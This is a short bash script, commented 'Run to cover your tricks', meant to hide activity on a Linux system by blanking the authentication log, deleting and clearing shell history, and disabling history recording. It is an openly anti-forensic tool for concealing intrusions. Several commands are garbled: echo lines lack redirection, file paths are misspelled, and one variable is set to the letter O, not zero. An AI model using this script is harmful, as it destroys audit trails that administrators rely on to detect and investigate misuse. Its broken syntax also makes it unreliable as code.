#!/bin/bash


#Run to cover your tricks
#clean auth.log
echo "" /var/log/auth.log &
# clean bash history
echo '''' -/.bash history &
# delete history file
rm ~/.bash_histor -rf &
#clean curret session history
history -c &
#Set history max lines to 0
export HISTFILESIZE = 0 &
#Set history max commands to 0
export HISTSIZE=O &
#disable history logging
unset HISTFILE
